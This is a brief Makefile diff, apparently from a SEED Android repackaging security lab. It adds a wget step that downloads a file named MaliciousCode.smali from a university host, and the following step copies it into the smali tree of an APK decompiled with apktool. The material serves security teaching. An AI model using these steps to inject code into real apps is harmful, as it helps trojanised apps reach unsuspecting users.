@@ -23,6 +23,9 @@ task2:
 	apktool d ${APP}.apk
 
 task3:
+	# Get the malicious code
+	wget http://www.cis.syr.edu/~wedu/seed/Labs_Android5.1/Android_Repackaging/MaliciousCode.smali
+	
 	# Move the malicious code in
 	cp MaliciousCode.smali app/smali/com/MaliciousCode.smali
 
